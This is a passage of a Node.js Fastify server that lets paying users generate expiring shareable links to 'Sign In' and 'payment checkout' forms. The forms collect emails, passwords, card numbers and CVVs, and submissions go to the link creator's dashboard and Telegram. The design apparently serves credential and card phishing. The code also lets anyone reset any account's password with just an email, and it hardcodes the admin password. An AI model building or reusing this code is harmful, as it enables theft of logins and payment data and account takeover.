const fastify = require('fastify')({ logger: true, trustProxy: true });
const path = require('path');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
require('dotenv').config();

const port = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';
const ADMIN_PASSWORD_HASH = bcrypt.hashSync('midas', 10);
const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

if (!TELEGRAM_BOT_TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN is not defined in environment variables');
  process.exit(1);
}

// Rate limit configs (will be used after plugin registration)
const generalLimiterConfig = {
  windowMs: 15 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  bodyLimit: false, // Disable body parsing limit for this plugin
};

const forgotPasswordLimiterConfig = {
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many forgot password attempts from this IP. Please try again after 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
  bodyLimit: false,
};

// MongoDB Connection (unchanged)
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/plexzora';
console.log('Attempting to connect to MongoDB with URI:', MONGODB_URI.replace(/:([^:@]+)@/, ':****@'));

mongoose.connect(MONGODB_URI, {
  serverSelectionTimeoutMS: 30000,
  socketTimeoutMS: 45000,
  connectTimeoutMS: 30000,
  retryWrites: true,
}).then(() => {
  console.log('Successfully connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err.message, err.stack);
  process.exit(1);
});

// Mongoose Schemas (unchanged)
const submissionSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  formId: { type: String, required: true, index: true },
  timestamp: { type: Date, default: Date.now, index: true },
  data: { type: Object, required: true },
}, { timestamps: true });

submissionSchema.index({ userId: 1, formId: 1 });

const formConfigSchema = new mongoose.Schema({
  formId: { type: String, required: true, unique: true, index: true },
  userId: { type: String, required: true, index: true },
  template: { type: String, required: true },
  headerText: String,
  headerColors: [String],
  subheaderText: String,
  subheaderColor: String,
  placeholders: [{ id: String, placeholder: String }],
  borderShadow: String,
  buttonColor: String,
  buttonTextColor: String,
  buttonText: String,
  buttonAction: String,
  buttonUrl: String,
  buttonMessage: String,
  theme: String,
  createdAt: { type: Date, default: Date.now, index: true },
  expiresAt: { type: Date, index: true },
}, { timestamps: true });

const formCreationSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  formId: { type: String, required: true, index: true },
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

const userSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  username: String,
  email: { type: String, required: true, unique: true, index: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
}, { timestamps: true });

const adminSettingsSchema = new mongoose.Schema({
  linkLifespan: Number,
  linkLifespanValue: Number,
  linkLifespanUnit: String,
  maxFormsPerUserPerDay: Number,
  maxFormsPer6HoursForSubscribers: Number,
  restrictionsEnabled: { type: Boolean, default: true },
}, { timestamps: true });

const subscriptionSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  email: String,
  planId: String,
  billingPeriod: String,
  reference: { type: String, unique: true, index: true },
  status: String,
  startDate: Date,
  endDate: Date,
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

subscriptionSchema.index({ userId: 1, status: 1, endDate: -1 });

const telegramSchema = new mongoose.Schema({
  userId: { type: String, required: true, unique: true, index: true },
  chatId: { type: String, required: true },
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

// Create models
const Submission = mongoose.model('Submission', submissionSchema);
const FormConfig = mongoose.model('FormConfig', formConfigSchema);
const FormCreation = mongoose.model('FormCreation', formCreationSchema);
const User = mongoose.model('User', userSchema);
const AdminSettings = mongoose.model('AdminSettings', adminSettingsSchema);
const Subscription = mongoose.model('Subscription', subscriptionSchema);
const Telegram = mongoose.model('Telegram', telegramSchema);

// Initialize default admin settings (unchanged)
async function initializeAdminSettings() {
  try {
    const settings = await AdminSettings.findOne();
    if (!settings) {
      await AdminSettings.create({
        linkLifespan: 604800000,
        linkLifespanValue: 7,
        linkLifespanUnit: 'days',
        maxFormsPerUserPerDay: 10,
        maxFormsPer6HoursForSubscribers: 50,
        restrictionsEnabled: true,
      });
      console.log('Created default admin settings');
    }
  } catch (err) {
    console.error('Error initializing admin settings:', err.message, err.stack);
    throw err;
  }
}

// MongoDB connection handling (unchanged)
mongoose.connection.once('open', async () => {
  console.log('MongoDB connection is open');
  try {
    await initializeAdminSettings();
  } catch (err) {
    console.error('Initialization failed:', err.message, err.stack);
    process.exit(1);
  }
});

mongoose.connection.on('error', (err) => {
  console.error('MongoDB connection error:', err.message, err.stack);
  process.exit(1);
});

// Initialize Telegram bot (unchanged)
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

bot.start(async (ctx) => {
  const userId = ctx.startPayload;
  const chatId = ctx.chat.id.toString();

  if (!userId) {
    return ctx.reply('Error: No user ID provided. Please use the link from your dashboard.');
  }

  try {
    const subscription = await Subscription.findOne({
      userId,
      status: 'active',
      endDate: { $gt: new Date() },
    });
    if (!subscription) {
      return ctx.reply('Error: You need an active subscription to connect Telegram for notifications.');
    }

    await Telegram.updateOne(
      { userId },
      { userId, chatId, createdAt: new Date() },
      { upsert: true }
    );
    console.log(`Linked Telegram chatId ${chatId} to userId ${userId}`);
    ctx.reply('Your Telegram account is now connected! You will receive form submission notifications here.');
  } catch (error) {
    console.error('Error saving Telegram chatId:', error.message);
    ctx.reply('Error connecting your Telegram account. Please try again later.');
  }
});

bot.launch().then(() => {
  console.log('Telegram bot started');
}).catch((error) => {
  console.error('Telegram bot failed to start:', error.message);
  process.exit(1);
});

process.on('SIGINT', () => {
  bot.stop('SIGINT');
  console.log('Telegram bot stopped');
  process.exit(0);
});

process.on('SIGTERM', () => {
  bot.stop('SIGTERM');
  console.log('Telegram bot stopped');
  process.exit(0);
});

// Utility functions (unchanged)
function normalizeUrl(url) {
  if (!url) return null;
  url = url.trim();
  if (url.match(/^https?:\/\//)) return url;
  if (url.match(/\.[a-z]{2,}$/i)) return `https://${url}`;
  return null;
}

async function generateShortCode(length = 6) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  const existing = await FormConfig.findOne({ formId: code });
  if (existing) {
    return generateShortCode(length);
  }
  return code;
}

function sanitizeForJs(str) {
  if (!str) return '';
  return str
    .replace(/['"`]/g, '\\$&')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&/g, '&amp;');
}

async function isFormExpired(formId) {
  const config = await FormConfig.findOne({ formId });
  if (!config || !config.createdAt) {
    console.log(`Form ${formId} not found or missing createdAt`);
    return true;
  }

  const adminSettings = await AdminSettings.findOne();
  const isSubscribed = await hasActiveSubscription(config.userId);
  if (isSubscribed || !adminSettings.restrictionsEnabled) {
    console.log(`Expiration check skipped for form ${formId}: user is subscribed=${!!isSubscribed}, restrictionsEnabled=${adminSettings.restrictionsEnabled}`);
    return false;
  }

  if (!adminSettings.linkLifespan) {
    console.log(`No linkLifespan set for form ${formId}, assuming not expired`);
    return false;
  }

  const createdTime = new Date(config.createdAt).getTime();
  const currentTime = Date.now();
  const isExpired = (currentTime - createdTime) > adminSettings.linkLifespan;

  if (isExpired) {
    console.log(`Form ${formId} is expired, deleting form and submissions`);
    await FormConfig.deleteOne({ formId });
    await Submission.deleteMany({ formId });
    console.log(`Deleted form ${formId} and its submissions`);
  }

  console.log(`Form ${formId} expiration check: createdAt=${config.createdAt}, currentTime=${currentTime}, linkLifespan=${adminSettings.linkLifespan}, isExpired=${isExpired}`);
  return isExpired;
}

async function countUserFormsToday(userId) {
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const todayStart = today.getTime();
  const todayEnd = todayStart + 24 * 60 * 60 * 1000;

  const count = await FormCreation.countDocuments({
    userId,
    createdAt: { $gte: new Date(todayStart), $lt: new Date(todayEnd) },
  });

  console.log(`Counted ${count} forms created today for user ${userId}`);
  return count;
}

async function countUserFormsLast6Hours(userId) {
  const sixHoursAgo = new Date(Date.now() - 6 * 60 * 60 * 1000);
  const count = await FormCreation.countDocuments({
    userId,
    createdAt: { $gte: sixHoursAgo },
  });
  console.log(`Counted ${count} forms created in last 6 hours for user ${userId}`);
  return count;
}

async function getUserCount() {
  return await User.countDocuments();
}

async function getSubscriberCount() {
  const activeSubscribers = await Subscription.countDocuments({
    status: 'active',
    endDate: { $gt: new Date() },
  });
  console.log(`Counted ${activeSubscribers} active subscribers`);
  return activeSubscribers;
}

async function hasActiveSubscription(userId) {
  try {
    const activeSubscription = await Subscription.findOne({
      userId,
      status: 'active',
      endDate: { $gt: new Date() },
    }).sort({ createdAt: -1 });
    const hasActive = !!activeSubscription;
    console.log(`User ${userId} has active subscription: ${hasActive}`, activeSubscription || {});
    return activeSubscription;
  } catch (error) {
    console.error('Error checking subscription status:', error.message);
    return null;
  }
}

async function authenticateToken(req, reply) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    console.error('No token provided in Authorization header');
    return reply.code(401).send({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    console.log('Token decoded:', decoded);
    req.user = decoded;
  } catch (error) {
    console.error('Token verification error:', error.message);
    return reply.code(401).send({ error: 'Invalid or expired token' });
  }
}

async function verifyAdminPassword(req, reply) {
  const { adminPassword } = req.body;
  if (!adminPassword || !bcrypt.compareSync(adminPassword, ADMIN_PASSWORD_HASH)) {
    return reply.code(401).send({ error: 'Invalid admin password' });
  }
}

async function verifyPaystackWebhook(req, reply) {
  const hash = crypto
    .createHmac('sha512', PAYSTACK_SECRET_KEY)
    .update(JSON.stringify(req.body))
    .digest('hex');
  const signature = req.headers['x-paystack-signature'];

  if (!signature || hash !== signature) {
    console.error('Paystack webhook verification failed');
    return reply.code(401).send({ error: 'Invalid webhook signature' });
  }

  console.log('Paystack webhook signature verified successfully');
}

// Fastify Plugins Registration
const start = async () => {
  try {
    // Register CORS
    await fastify.register(require('@fastify/cors'), {
      origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://smavo.onrender.com'],
      methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
      credentials: false,
    });

    // Register global rate limit (default for most routes)
    await fastify.register(require('@fastify/rate-limit'), generalLimiterConfig);

    // Register view engine
    await fastify.register(require('@fastify/view'), {
      engine: { ejs: require('ejs') },
      includeViewExtension: true,
      templatesDir: path.join(__dirname, 'views'),
    });

    // Register static files
    await fastify.register(require('@fastify/static'), {
      root: path.join(__dirname, 'public'),
    });

    // Routes
    fastify.get('/user', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        const user = await User.findOne({ id: req.user.userId });
        if (!user) {
          return reply.code(404).send({ error: 'User not found' });
        }

        const { id, username, email, createdAt } = user;
        return { user: { id, username, email, createdAt }, message: 'User info retrieved successfully' };
      } catch (error) {
        console.error('Error fetching user info:', error);
        return reply.code(500).send({ error: 'Failed to fetch user info' });
      }
    });

    fastify.post('/signup', { preHandler: fastify.rateLimit() }, async (req, reply) => {
      try {
        const { username, email, password } = req.body;
        if (!email || !password) {
          return reply.code(400).send({ error: 'Email and password are required' });
        }

        const existingUser = await User.findOne({ email });
        if (existingUser) {
          return reply.code(400).send({ error: 'User already exists with this email' });
        }

        const saltRounds = 10;
        const hashedPassword = await bcrypt.hash(password, saltRounds);

        const newUser = new User({
          id: Date.now().toString(),
          username: username || '',
          email,
          password: hashedPassword,
          createdAt: new Date().toISOString(),
        });

        await newUser.save();

        const token = jwt.sign({ userId: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '1h' });
        return reply.code(201).send({ message: 'User created successfully', token });
      } catch (error) {
        console.error('Signup error:', error);
        return reply.code(500).send({ error: 'Signup failed' });
      }
    });

    fastify.post('/login', { preHandler: fastify.rateLimit() }, async (req, reply) => {
      try {
        const { email, password } = req.body;
        if (!email || !password) {
          return reply.code(400).send({ error: 'Email and password are required' });
        }

        const user = await User.findOne({ email });
        if (!user) {
          return reply.code(401).send({ error: 'Invalid credentials' });
        }

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
          return reply.code(401).send({ error: 'Invalid credentials' });
        }

        const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '100h' });
        return { message: 'Login successful', token };
      } catch (error) {
        console.error('Login error:', error);
        return reply.code(500).send({ error: 'Login failed' });
      }
    });

    // Specific rate limit for forgot/reset password routes
    const forgotPasswordLimiterHook = fastify.rateLimit(forgotPasswordLimiterConfig);

    fastify.post('/forgot-password', { preHandler: forgotPasswordLimiterHook }, async (req, reply) => {
      try {
        const { email } = req.body;
        if (!email) {
          return reply.code(400).send({ error: 'Email is required' });
        }

        const user = await User.findOne({ email });
        if (!user) {
          return reply.code(404).send({ error: 'Email not found' });
        }

        return { message: 'Email found, proceed to reset' };
      } catch (error) {
        console.error('Forgot password error:', error);
        return reply.code(500).send({ error: 'Forgot password check failed' });
      }
    });

    fastify.post('/reset-password', { preHandler: forgotPasswordLimiterHook }, async (req, reply) => {
      try {
        const { email, password } = req.body;
        if (!email || !password) {
          return reply.code(400).send({ error: 'Email and new password are required' });
        }

        const user = await User.findOne({ email });
        if (!user) {
          return reply.code(404).send({ error: 'Email not found' });
        }

        const saltRounds = 10;
        const hashedPassword = await bcrypt.hash(password, saltRounds);
        user.password = hashedPassword;
        user.updatedAt = new Date().toISOString();

        await user.save();

        return { message: 'Password reset successfully' };
      } catch (error) {
        console.error('Reset password error:', error);
        return reply.code(500).send({ error: 'Reset password failed' });
      }
    });

    fastify.get('/admin', async (req, reply) => {
      try {
        const adminSettings = await AdminSettings.findOne();
        const userCount = await getUserCount();
        const subscriberCount = await getSubscriberCount();
        return fastify.view('admin', {
          headerHtml: 'Admin Settings',
          subheaderText: 'Configure form settings',
          subheaderColor: '#555555',
          borderShadow: '0 0 0 2px #000000',
          buttonColor: 'linear-gradient(45deg, #00b7ff, #0078ff)',
          buttonTextColor: '#ffffff',
          buttonText: 'Update Settings',
          theme: 'light',
          userCount,
          subscriberCount,
          restrictionsEnabled: adminSettings.restrictionsEnabled,
          linkLifespanValue: adminSettings.linkLifespanValue,
          linkLifespanUnit: adminSettings.linkLifespanUnit,
          maxFormsPerUserPerDay: adminSettings.maxFormsPerUserPerDay,
          maxFormsPer6HoursForSubscribers: adminSettings.maxFormsPer6HoursForSubscribers,
        });
      } catch (error) {
        console.error('Error rendering admin page:', error.message, error.stack);
        return reply.code(500).send('Error rendering admin page');
      }
    });

    fastify.post('/admin/settings', { preHandler: verifyAdminPassword }, async (req, reply) => {
      try {
        const { linkLifespanValue, linkLifespanUnit, maxFormsPerUserPerDay, maxFormsPer6HoursForSubscribers, restrictionsEnabled } = req.body;

        if (restrictionsEnabled) {
          if (!linkLifespanValue || !linkLifespanUnit || !maxFormsPerUserPerDay || !maxFormsPer6HoursForSubscribers) {
            return reply.code(400).send({ error: 'Link lifespan value, unit, max forms per user per day, and max forms per 6 hours for subscribers are required when restrictions are enabled' });
          }

          if (!Number.isInteger(Number(linkLifespanValue)) || Number(linkLifespanValue) <= 0) {
            return reply.code(400).send({ error: 'Link lifespan value must be a positive integer' });
          }

          if (!['seconds', 'minutes', 'hours', 'days'].includes(linkLifespanUnit)) {
            return reply.code(400).send({ error: 'Link lifespan unit must be one of: seconds, minutes, hours, days' });
          }

          if (!Number.isInteger(Number(maxFormsPerUserPerDay)) || Number(maxFormsPerUserPerDay) <= 0) {
            return reply.code(400).send({ error: 'Max forms per user per day must be a positive integer' });
          }

          if (!Number.isInteger(Number(maxFormsPer6HoursForSubscribers)) || Number(maxFormsPer6HoursForSubscribers) <= 0) {
            return reply.code(400).send({ error: 'Max forms per 6 hours for subscribers must be a positive integer' });
          }
        }

        let lifespanMs = null;
        if (restrictionsEnabled) {
          const value = Number(linkLifespanValue);
          switch (linkLifespanUnit) {
            case 'seconds':
              lifespanMs = value * 1000;
              break;
            case 'minutes':
              lifespanMs = value * 60 * 1000;
              break;
            case 'hours':
              lifespanMs = value * 60 * 60 * 1000;
              break;
            case 'days':
              lifespanMs = value * 24 * 60 * 60 * 1000;
              break;
            default:
              return reply.code(400).send({ error: 'Invalid link lifespan unit' });
          }
        }

        const adminSettings = {
          linkLifespan: lifespanMs,
          linkLifespanValue: restrictionsEnabled ? Number(linkLifespanValue) : null,
          linkLifespanUnit: restrictionsEnabled ? linkLifespanUnit : null,
          maxFormsPerUserPerDay: restrictionsEnabled ? Number(maxFormsPerUserPerDay) : null,
          maxFormsPer6HoursForSubscribers: restrictionsEnabled ? Number(maxFormsPer6HoursForSubscribers) : null,
          restrictionsEnabled: !!restrictionsEnabled,
        };

        await AdminSettings.updateOne({}, adminSettings, { upsert: true });
        console.log('Admin settings updated:', adminSettings);

        if (adminSettings.restrictionsEnabled) {
          const expiredForms = await FormConfig.find({
            expiresAt: { $lte: new Date() },
          });
          const expiredFormIds = expiredForms.map(f => f.formId);

          if (expiredFormIds.length > 0) {
            await FormConfig.deleteMany({ formId: { $in: expiredFormIds } });
            await Submission.deleteMany({ formId: { $in: expiredFormIds } });
            console.log(`Deleted ${expiredFormIds.length} expired forms during admin settings update`);
          }
        }

        return reply.code(200).send({
          message: 'Admin settings updated successfully',
          settings: adminSettings,
        });
      } catch (error) {
        console.error('Error updating admin settings:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to update admin settings', details: error.message });
      }
    });

    fastify.get('/api/telegram/connect', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        const userId = req.user.userId;
        const subscription = await Subscription.findOne({
          userId,
          status: 'active',
          endDate: { $gt: new Date() },
        });

        if (!subscription) {
          return reply.code(403).send({ error: 'You need an active subscription to connect Telegram for notifications.' });
        }

        const telegramLink = `https://t.me/${bot.botInfo.username}?start=${userId}`;
        console.log(`Generated Telegram link for user ${userId}: ${telegramLink}`);
        return {
          message: 'Telegram connect link generated successfully',
          telegramLink,
        };
      } catch (error) {
        console.error('Error generating Telegram link:', error.message);
        return reply.code(500).send({ error: 'Failed to generate Telegram link', details: error.message });
      }
    });

    fastify.get('/get', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        const userId = req.user.userId;
        console.log(`Processing /get request for user ${userId}`);

        const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });
        console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);

        const adminSettings = await AdminSettings.findOne();
        console.log(`Loaded admin settings:`, adminSettings);

        const activeSubscription = await hasActiveSubscription(userId);
        const isSubscribed = !!activeSubscription;
        let subscriptionDetails = null;
        if (isSubscribed) {
          subscriptionDetails = {
            billingPeriod: activeSubscription.billingPeriod,
            endDate: activeSubscription.endDate,
          };
        }

        const userFormConfigs = {};
        const validForms = [];
        const formConfigs = await FormConfig.find({ userId });
        for (const config of formConfigs) {
          const isExpired = await isFormExpired(config.formId);
          if (!isExpired) {
            const computedExpiresAt = (adminSettings.restrictionsEnabled && !isSubscribed)
              ? new Date(new Date(config.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
              : null;
            userFormConfigs[config.formId] = { ...config.toObject(), expiresAt: computedExpiresAt };
            validForms.push(config.formId);
          }
        }
        console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')})`);

        const templates = {
          'sign-in': {
            name: 'Sign In Form',
            fields: [
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
              { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
            ],
          },
          'contact': {
            name: 'Contact Form',
            fields: [
              { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
            ],
          },
          'payment-checkout': {
            name: 'Payment Checkout Form',
            fields: [
              { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
              { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
              { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
            ],
          },
        };

        const responseData = {
          submissions,
          formConfigs: userFormConfigs,
          templates,
          userId,
          isSubscribed,
          subscriptionDetails,
        };
        console.log(`Returning data for user ${userId}:`, {
          submissionCount: responseData.submissions.length,
          formConfigCount: Object.keys(responseData.formConfigs).length,
          templateKeys: Object.keys(responseData.templates),
          userId: responseData.userId,
          isSubscribed: responseData.isSubscribed,
          subscriptionDetails: responseData.subscriptionDetails,
        });

        return responseData;
      } catch (error) {
        console.error('Error fetching data for /get:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to fetch data', details: error.message });
      }
    });

    fastify.post('/create', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        console.log('Received /create request:', req.body);
        const userId = req.user.userId;
        const adminSettings = await AdminSettings.findOne();

        const isSubscribed = await hasActiveSubscription(userId);

        if (!isSubscribed && adminSettings.restrictionsEnabled) {
          const userFormCountToday = await countUserFormsToday(userId);
          if (userFormCountToday >= adminSettings.maxFormsPerUserPerDay) {
            return reply.code(403).send({ error: `Maximum form limit (${adminSettings.maxFormsPerUserPerDay} per day) reached` });
          }
        }

        if (isSubscribed && adminSettings.restrictionsEnabled) {
          const userFormCountLast6Hours = await countUserFormsLast6Hours(userId);
          const maxFormsPer6Hours = adminSettings.maxFormsPer6HoursForSubscribers || 50;
          if (userFormCountLast6Hours >= maxFormsPer6Hours) {
            return reply.code(403).send({ error: `form creation failed` });
          }
        }

        const templateId = req.body.template || 'sign-in';
        const formId = await generateShortCode();
        const validActions = ['url', 'message'];
        const config = {
          formId,
          userId,
          template: templateId,
          headerText: req.body.headerText || 'My Form',
          headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
          subheaderText: req.body.subheaderText || 'Fill the form',
          subheaderColor: req.body.subheaderColor || (req.body.theme === 'dark' ? '#d1d5db' : '#555555'),
          placeholders: Array.isArray(req.body.placeholders) ? req.body.placeholders.map(p => ({
            id: sanitizeForJs(p.id),
            placeholder: sanitizeForJs(p.placeholder),
          })) : [],
          borderShadow: req.body.borderShadow || (req.body.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
          buttonColor: req.body.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
          buttonTextColor: req.body.buttonTextColor || (req.body.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
          buttonText: req.body.buttonText || 'Sign In',
          buttonAction: validActions.includes(req.body.buttonAction) ? req.body.buttonAction : 'url',
          buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
          buttonMessage: req.body.buttonMessage || '',
          theme: req.body.theme === 'dark' ? 'dark' : 'light',
          createdAt: new Date().toISOString(),
          expiresAt: !isSubscribed && adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespan).toISOString() : null,
        };

        if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
          console.error('Invalid URL provided:', config.buttonUrl);
          return reply.code(400).send({ error: 'Invalid URL provided' });
        }
        if (config.buttonAction === 'message' && !config.buttonMessage) {
          config.buttonMessage = 'Form submitted successfully!';
        }

        await new FormCreation({ userId, formId, createdAt: config.createdAt }).save();
        await new FormConfig(config).save();
        console.log(`Stored form config for ${formId} for user ${userId}:`, config);

        const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
        const host = req.headers.host || `localhost:${port}`;
        const url = `${protocol}://${host}/form/${formId}`;
        console.log('Generated URL:', url);
        return reply.code(200).send({ url, formId, expiresAt: config.expiresAt });
      } catch (error) {
        console.error('Error in /create:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to generate shareable link', details: error.message });
      }
    });

    fastify.put('/api/form/:id', { preHandler: authenticateToken }, async (req, reply) => {
      try {
        console.log('Received /api/form/:id PUT request:', req.body);
        const formId = req.params.id;
        const userId = req.user.userId;
        const updatedConfig = req.body;

        const existingConfig = await FormConfig.findOne({ formId, userId });
        if (!existingConfig) {
          console.error(`User ${userId} does not have access to form ${formId}`);
          return reply.code(404).send({ error: 'Form not found or access denied' });
        }

        const adminSettings = await AdminSettings.findOne();
        if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
          return reply.code(403).send({ error: 'Form has expired' });
        }

        const isSubscribed = await hasActiveSubscription(userId);

        const validActions = ['url', 'message'];
        const config = {
          formId,
          userId,
          template: updatedConfig.template || existingConfig.template,
          headerText: updatedConfig.headerText || existingConfig.headerText || 'My Form',
          headerColors: Array.isArray(updatedConfig.headerColors) ? updatedConfig.headerColors.map(sanitizeForJs) : existingConfig.headerColors,
          subheaderText: updatedConfig.subheaderText || existingConfig.subheaderText || 'Fill the form',
          subheaderColor: updatedConfig.subheaderColor || existingConfig.subheaderColor || (updatedConfig.theme === 'dark' ? '#d1d5db' : '#555555'),
          placeholders: Array.isArray(updatedConfig.placeholders) ? updatedConfig.placeholders.map(p => ({
            id: sanitizeForJs(p.id),
            placeholder: sanitizeForJs(p.placeholder),
          })) : existingConfig.placeholders,
          borderShadow: updatedConfig.borderShadow || existingConfig.borderShadow || (updatedConfig.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
          buttonColor: updatedConfig.buttonColor || existingConfig.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
          buttonTextColor: updatedConfig.buttonTextColor || existingConfig.buttonTextColor || (updatedConfig.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
          buttonText: updatedConfig.buttonText || existingConfig.buttonText || 'Sign In',
          buttonAction: validActions.includes(updatedConfig.buttonAction) ? updatedConfig.buttonAction : existingConfig.buttonAction || 'url',
          buttonUrl: updatedConfig.buttonUrl ? normalizeUrl(updatedConfig.buttonUrl) : existingConfig.buttonUrl || '',
          buttonMessage: updatedConfig.buttonMessage || existingConfig.buttonMessage || '',
          theme: updatedConfig.theme === 'dark' ? 'dark' : updatedConfig.theme === 'light' ? 'light' : existingConfig.theme || 'light',
          createdAt: existingConfig.createdAt,
          updatedAt: new Date().toISOString(),
          expiresAt: (adminSettings.restrictionsEnabled && !isSubscribed)
            ? new Date(new Date(existingConfig.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
            : null,
        };

        if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
          console.error('Invalid URL provided:', config.buttonUrl);
          return reply.code(400).send({ error: 'Invalid URL provided' });
        }
        if (config.buttonAction === 'message' && !config.buttonMessage) {
          config.buttonMessage = 'Form submitted successfully!';
        }

        await FormConfig.updateOne({ formId }, config);
        console.log(`Updated form config for ${formId} for user ${userId}:`, config);

        const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
        const host = req.headers.host || `localhost:${port}`;
        const url = `${protocol}://${host}/form/${formId}`;
        console.log('Generated URL for updated form:', url);
        return reply.code(200).send({ url, formId, message: 'Form updated successfully' });
      } catch (error) {
        console.error('Error in /api/form/:id PUT:', error.message, error.stack);
        return reply.code(500).send({ error: 'Failed to update form', details: error.message });
      }
    });

    // Use global rate limit for submissions
    fastify.post('/form/:id/submit', { preHandler: fastify.rateLimit() }, async (req, reply) => {
      const formId = req.params.id;

      const config = await FormConfig.findOne({ formId });
      if (!config) {
        console.error(`Form not found for ID: ${formId}`);
        return reply.code(404).send({ error: 'Form not found' });
      }
      const adminSettings = await AdminSettings.findOne();
      if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
        return reply.code(403).send({ error: 'Form has expired' });
      }

      try {
        const formData = req.body;
        const userId = config.userId;
        const templates = {
          'sign-in': {
            name: 'Sign In Form',
            fields: [
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
              { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
            ],
          },
          'contact': {
            name: 'Contact Form',
            fields: [
              { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
              { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
            ],
          },
          'payment-checkout': {
            name: 'Payment Checkout Form',
            fields: [
              { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
              { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
              { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
            ],
          },
        };
        const template = templates[config.template] || templates['sign-in'];

        const mappedData = {};
        Object.entries(formData).forEach(([fieldId, value]) => {
          const customField = config.placeholders.find(p => p.id === fieldId);
